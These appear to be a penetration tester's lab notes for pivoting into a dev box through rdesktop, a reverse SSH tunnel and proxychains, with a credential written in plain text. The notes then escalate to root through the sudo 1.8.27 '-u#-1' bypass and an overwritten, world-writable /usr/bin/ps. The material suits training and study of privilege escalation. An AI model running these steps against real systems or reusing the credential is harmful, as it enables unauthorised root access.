Get to l.strauss@devbox.artstailor.com the usual way
    * sudo service ssh start
    * rdesktop -g 90% innerouter.artstailor.com > pr0b3 H4ckB4ckJ4ck
    * ssh -R 1081 kali@172.24.0.10
    * proxychains ssh l.strauss@devbox.artstailor.com
Exploration:
    * Look around and see sudo -V is 1.8.27 which means we can use the 
    sudo -u#-1 [command] vulnerability
    * sudo -l reveals we can try and manipulate the ps command
    * getfacl /usr/bin/ps reveals we have write access
    * playing with ps.special reveals this is initiates a bash shell
    * can use sudo and this ps.special to possibly create a root shell
    * overwrite /usr/bin/ps with ~/bins/ps.special
        cat ~/bins/ps.special > /usr/bin/ps
    * put it all together 
        sudo -u#-1 ps
